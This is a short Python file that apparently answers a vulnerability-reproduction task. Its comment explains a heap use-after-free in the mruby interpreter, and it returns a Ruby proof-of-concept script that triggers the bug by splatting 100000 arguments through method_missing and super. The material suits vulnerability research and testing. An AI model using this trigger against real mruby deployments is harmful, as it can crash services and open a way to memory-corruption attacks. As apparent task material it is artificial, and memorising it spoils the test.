class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability corresponds to a Heap Use-After-Free in mruby
        # where mrb_stack_extend reallocates the stack, but the VM's internal
        # 'regs' pointer is not updated, pointing to freed memory.
        # This is often triggered by passing a large number of arguments (via splat)
        # in a context like method_missing/super.
        
        poc_script = (
            "def method_missing(*)\n"
            "  super\n"
            "end\n"
            "send(:f, *[0] * 100000)\n"
        )
        return poc_script.encode('utf-8')